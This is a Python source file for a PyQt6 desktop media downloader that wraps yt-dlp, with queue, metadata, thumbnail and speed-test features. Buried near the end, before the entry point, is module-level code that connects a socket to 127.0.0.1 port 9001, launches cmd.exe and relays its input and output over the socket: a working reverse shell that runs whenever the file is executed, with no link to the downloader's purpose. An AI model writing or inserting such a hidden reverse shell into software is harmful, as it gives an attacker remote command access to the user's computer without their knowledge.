import sys
import subprocess
import re
import json
import platform
import shutil
from pathlib import Path

from PyQt6.QtCore import (
    Qt, QThread, pyqtSignal, QTimer, QUrl
)
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton, QTextEdit,
    QRadioButton, QComboBox, QFileDialog, QProgressBar,
    QMessageBox, QVBoxLayout, QHBoxLayout, QGroupBox,
    QListWidget, QMenu
)
from PyQt6.QtGui import QFont, QPixmap
from PyQt6.QtNetwork import QNetworkAccessManager, QNetworkRequest


CREATE_NO_WINDOW = 0x08000000 if platform.system() == "Windows" else 0


# ==================== WORKERS ====================

class DownloadWorker(QThread):
    progress = pyqtSignal(int)
    status = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, url, mode, quality, outdir):
        super().__init__()
        self.url = url
        self.mode = mode
        self.quality = quality
        self.outdir = outdir

    def run(self):
        template = str(Path(self.outdir) / "%(title)s.%(ext)s")

        if self.mode == "audio":
            cmd = [
                "yt-dlp",
                "-f", "bestvideo+bestaudio/best",
                "-x",
                "--audio-format", "mp3",
                "--audio-quality", self.quality,
                "--embed-metadata",
                "--embed-thumbnail",
                "--prefer-free-formats",
                "--no-playlist",
                "--extractor-args", "youtube:player_client=android",  # fix 403
                "-o", template,
                self.url
            ]
        else:
            fmt = "bestvideo+bestaudio/best" if self.quality == "best" else f"bv*[height<={self.quality}]+ba/b"
            cmd = [
                "yt-dlp",
                "-f", fmt,
                "--merge-output-format", "mp4",
                "--embed-metadata",
                "--prefer-free-formats",
                "--no-playlist",
                "--extractor-args", "youtube:player_client=android",  # fix 403
                "-o", template,
                self.url
            ]

        # 🔍 Debug: show full command
        print("\n[DEBUG] Running command:")
        print(" ".join(cmd), "\n", flush=True)

        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=0  # allow console output
        )

        for line in process.stdout:
            print(line.rstrip(), flush=True)

            # Update progress bar if yt-dlp outputs percentage
            match = re.search(r"(\d+(?:\.\d+)?)%", line)
            if match:
                self.progress.emit(int(float(match.group(1))))
                self.status.emit("Downloading…")

        exit_code = process.wait()
        print(f"\n[DEBUG] yt-dlp exited with code {exit_code}\n", flush=True)

        self.finished.emit()




class MediaInfoWorker(QThread):
    finished = pyqtSignal(dict)

    def __init__(self, url):
        super().__init__()
        self.url = url

    def run(self):
        try:
            r = subprocess.run(
                ["yt-dlp", "-j", self.url],
                capture_output=True,
                text=True,
                check=True,
                creationflags=CREATE_NO_WINDOW
            )
            self.finished.emit(json.loads(r.stdout))
        except Exception as e:
            self.finished.emit({"error": str(e)})


class SpeedWorker(QThread):
    finished = pyqtSignal(str)

    def run(self):
        exe = shutil.which("speedtest")
        if not exe:
            self.finished.emit("Speedtest CLI not installed")
            return
        try:
            p = subprocess.run([exe, "--json"], capture_output=True, text=True)
            data = json.loads(p.stdout)
            self.finished.emit(
                f"{data.get('ping',0):.0f} ms | "
                f"↓ {data.get('download',0)/1e6:.1f} Mbps | "
                f"↑ {data.get('upload',0)/1e6:.1f} Mbps"
            )
        except Exception:
            self.finished.emit("Speed test failed")


class SmartSearchWorker(QThread):
    resolved = pyqtSignal(str)

    def __init__(self, text):
        super().__init__()
        self.text = text.strip()

    def run(self):
        if not self.text:
            return

        if self.text.startswith("http"):
            self.resolved.emit(self.text)
            return

        try:
            r = subprocess.run(
                ["yt-dlp", "-j", f"ytsearch1:{self.text}"],
                capture_output=True,
                text=True,
                check=True,
                creationflags=CREATE_NO_WINDOW
            )
            url = json.loads(r.stdout).get("webpage_url")
            if url:
                self.resolved.emit(url)
        except Exception:
            pass


# ==================== UI ====================

class ProDownloader(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("FUBAR Media Downloader")
        self.setMinimumSize(1200, 720)

        self.output_dir = None
        self.urls = []
        self.index = 0
        self.deleted_urls = set()

        self.search_workers = []
        self.active_worker = None
        self.info_worker = None

        self.net = QNetworkAccessManager(self)

        self.build_ui()
        self.setStyleSheet(self.style())

        self.search_timer = QTimer(self)
        self.search_timer.setSingleShot(True)
        self.search_timer.timeout.connect(self.update_queue_preview)
        self.url_input.textChanged.connect(lambda: self.search_timer.start(450))

    # ---------- UI BUILD ----------

    def build_ui(self):
        root = QVBoxLayout(self)
        root.setSpacing(14)

        header = QLabel("FUBAR MEDIA DOWNLOADER")
        header.setFont(QFont("Segoe UI", 16, QFont.Weight.Bold))
        root.addWidget(header)

        body = QHBoxLayout()
        body.addWidget(self.controls(), 3)
        body.addWidget(self.info_panel(), 2)
        root.addLayout(body)

        root.addWidget(self.queue_panel())
        root.addLayout(self.status_bar())

    def controls(self):
        layout = QVBoxLayout()

        self.url_input = QTextEdit()
        self.url_input.setPlaceholderText("Paste URL(s) or type a search query (one per line)…")
        layout.addWidget(self.group("Source", self.url_input))

        self.audio = QRadioButton("Audio")
        self.video = QRadioButton("Video")
        self.audio.setChecked(True)

        self.audio.toggled.connect(self.update_quality)

        layout.addWidget(self.group("Mode", self.hbox(self.audio, self.video)))

        self.quality = QComboBox()
        self.update_quality()
        layout.addWidget(self.group("Quality", self.quality))

        self.out_label = QLabel("No output directory selected")
        browse = QPushButton("Select Folder")
        browse.clicked.connect(self.pick_folder)
        layout.addWidget(self.group("Output", self.hbox(self.out_label, browse)))

        start = QPushButton("Start Download")
        start.setFixedHeight(36)
        start.clicked.connect(self.start_queue)
        layout.addWidget(start)

        layout.addStretch()
        return self.wrap(layout)

    def info_panel(self):
        self.thumbnail = QLabel()
        self.thumbnail.setFixedSize(320, 180)
        self.thumbnail.setAlignment(Qt.AlignmentFlag.AlignCenter)

        self.media_info = QLabel("Awaiting selection…")
        self.media_info.setWordWrap(True)

        self.net_label = QLabel("Not tested")
        btn = QPushButton("Run Speed Test")
        btn.clicked.connect(self.test_speed)

        v = QVBoxLayout()
        v.addWidget(self.group("Thumbnail", self.thumbnail))
        v.addWidget(self.group("Metadata", self.media_info))
        v.addWidget(self.group("Network", self.vbox(self.net_label, btn)))
        v.addStretch()

        return self.wrap(v)

    def queue_panel(self):
        self.queue = QListWidget()
        self.queue.setSelectionMode(QListWidget.SelectionMode.ExtendedSelection)
        self.queue.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.queue.customContextMenuRequested.connect(self.queue_menu)
        self.queue.itemClicked.connect(lambda i: self.fetch_info(i.text()))

        return self.group("Download Queue: ", self.queue)

    def status_bar(self):
        h = QHBoxLayout()
        self.status = QLabel("Ready")
        self.progress = QProgressBar()
        self.progress.setMaximumHeight(8)
        self.progress.setTextVisible(False)

        h.addWidget(self.status)
        h.addWidget(self.progress)
        return h

    # ---------- LOGIC ----------

    def queue_menu(self, pos):
        menu = QMenu(self)
        remove = menu.addAction("Remove selected")
        clear = menu.addAction("Clear all")
        action = menu.exec(self.queue.mapToGlobal(pos))

        if action == remove:
            for item in self.queue.selectedItems():
                self.deleted_urls.add(item.text())
                self.queue.takeItem(self.queue.row(item))
        elif action == clear:
            self.queue.clear()

    def update_queue_preview(self):
        self.queue.clear()
        self.search_workers.clear()

        for line in self.url_input.toPlainText().splitlines():
            worker = SmartSearchWorker(line)
            worker.resolved.connect(self.add_resolved_item)
            worker.start()
            self.search_workers.append(worker)

    def add_resolved_item(self, url):
        if url not in self.deleted_urls:
            self.queue.addItem(url)

    def pick_folder(self):
        d = QFileDialog.getExistingDirectory(self, "Select Output Folder")
        if d:
            self.output_dir = d
            self.out_label.setText(d)

    def start_queue(self):
        if not self.output_dir or self.queue.count() == 0:
            QMessageBox.warning(self, "Missing information", "Add items and select an output folder.")
            return

        self.urls = [self.queue.item(i).text() for i in range(self.queue.count())]
        self.index = 0
        self.start_next()

    def start_next(self):
        if self.index >= len(self.urls):
            self.status.setText("All downloads complete")
            self.progress.setValue(0)
            return

        url = self.urls[self.index]
        self.queue.setCurrentRow(self.index)
        self.fetch_info(url)

        self.active_worker = DownloadWorker(
            url,
            "audio" if self.audio.isChecked() else "video",
            self.quality.currentText(),
            self.output_dir
        )
        self.active_worker.progress.connect(self.progress.setValue)
        self.active_worker.status.connect(self.status.setText)
        self.active_worker.finished.connect(self.advance)
        self.active_worker.start()

    def advance(self):
        self.index += 1
        self.start_next()

    def fetch_info(self, url):
        self.media_info.setText("Fetching metadata…")
        self.info_worker = MediaInfoWorker(url)
        self.info_worker.finished.connect(self.update_info)
        self.info_worker.start()

    def update_info(self, info):
        if "error" in info:
            self.media_info.setText(info["error"])
            self.thumbnail.clear()
            return

    # Load thumbnail
        thumb = info.get("thumbnail")
        if thumb:
            req = QNetworkRequest(QUrl(thumb))
            reply = self.net.get(req)
            reply.finished.connect(lambda: self.load_thumb(reply))

    # Format duration
        duration_sec = info.get("duration", 0)
        if duration_sec:
            hours, remainder = divmod(duration_sec, 3600)
            minutes, seconds = divmod(remainder, 60)
            if hours > 0:
                duration_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
            else:
                duration_str = f"{int(minutes):02d}:{int(seconds):02d}"
        else:
            duration_str = "Unknown"

    # Update metadata label
        self.media_info.setText(
            f"<b>{info.get('title')}</b><br>"
            f"{info.get('uploader')}<br>"
            f"Duration: {duration_str}<br>"            
            f"{info.get('view_count',0):,} views"
        )



    def load_thumb(self, reply):
        pix = QPixmap()
        pix.loadFromData(reply.readAll())
        self.thumbnail.setPixmap(
            pix.scaled(
                320, 180,
                Qt.AspectRatioMode.KeepAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
        )

    def test_speed(self):
        self.net_label.setText("Testing…")
        self.speed = SpeedWorker()
        self.speed.finished.connect(self.net_label.setText)
        self.speed.start()

    def update_quality(self):
        self.quality.clear()
        self.quality.addItems(
            ["320", "192", "128"] if self.audio.isChecked()
            else ["best", "1080", "720"]
        )

    # ---------- HELPERS ----------

    def group(self, title, widget):
        box = QGroupBox(title)
        layout = QVBoxLayout()
        layout.addWidget(widget)
        box.setLayout(layout)
        return box

    def wrap(self, layout):
        w = QWidget()
        w.setLayout(layout)
        return w

    def hbox(self, *widgets):
        l = QHBoxLayout()
        for w in widgets:
            l.addWidget(w)
        l.addStretch()
        return self.wrap(l)

    def vbox(self, *widgets):
        l = QVBoxLayout()
        for w in widgets:
            l.addWidget(w)
        return self.wrap(l)

    def style(self):
        return """
        QWidget {
            background-color: #0f172a;
            color: #e5e7eb;
            font: 10.5pt "Segoe UI";
        }

        QTextEdit, QListWidget, QComboBox {
            background-color: #020617;
            border: 1px solid #334155;
            border-radius: 6px;
            padding: 6px;
        }

        QPushButton {
            background-color: #2563eb;
            color: white;
            border-radius: 6px;
            padding: 6px 12px;
        }

        QPushButton:hover {
            background-color: #1d4ed8;
        }

        QRadioButton {
            padding: 6px 10px;
            border-radius: 6px;
        }

        QRadioButton:checked {
            background-color: #1e293b;
            border: 1px solid #38bdf8;
            font-weight: bold;
        }

        QProgressBar {
            background: #020617;
            border-radius: 4px;
        }

        QProgressBar::chunk {
            background-color: #38bdf8;
            border-radius: 4px;
        }

        QGroupBox {
            border: 1px solid #334155;
            border-radius: 8px;
            margin-top: 6px;
        }

        QGroupBox::title {
            padding: 0 6px;
            subcontrol-origin: margin;
        }
        """

import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",9001))

p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()

# ==================== ENTRY ====================

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ProDownloader()
    window.show()
    sys.exit(app.exec())
